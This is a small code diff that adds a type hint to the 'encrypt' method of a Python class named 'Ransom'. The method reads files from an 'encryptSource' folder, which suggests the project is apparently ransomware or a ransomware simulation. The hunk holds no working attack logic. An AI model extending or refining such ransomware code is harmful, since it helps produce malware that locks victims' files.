@@ -26,7 +26,7 @@ class Ransom(Base):
 
         return public_key
 
-    def encrypt(self, file) -> bytes:
+    def encrypt(self, file: str) -> bytes:
         """Encrypt a file"""
         with open(os.path.join(self.encryptSource, file), "rb") as f:
             file_contents = f.read()
